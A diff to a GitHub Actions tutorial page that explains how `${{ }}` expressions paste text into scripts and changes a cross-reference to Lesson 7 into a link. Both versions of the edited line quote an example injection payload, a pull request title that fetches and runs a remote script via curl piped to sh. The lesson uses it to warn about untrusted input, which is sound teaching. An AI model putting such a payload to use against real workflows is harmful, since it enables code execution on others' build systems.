@@ -16,7 +16,7 @@ sidebar:
 | Allowed in | almost any value of the YAML, and `if:` | only inside scripts |
 | C# analogy | a source generator: the text is produced before compilation | a variable read at run time |
 
-Because `${{ }}` pastes text into the script, **never** put untrusted values in it directly — a pull request title such as `"; curl evil.sh | sh; echo "` would become shell code. Pass them through `env:` and read `$VAR` instead. Lesson 7 comes back to it.
+Because `${{ }}` pastes text into the script, **never** put untrusted values in it directly — a pull request title such as `"; curl evil.sh | sh; echo "` would become shell code. Pass them through `env:` and read `$VAR` instead. [Lesson 7](../07-security/) runs it for real.
 
 ## The workflow
 
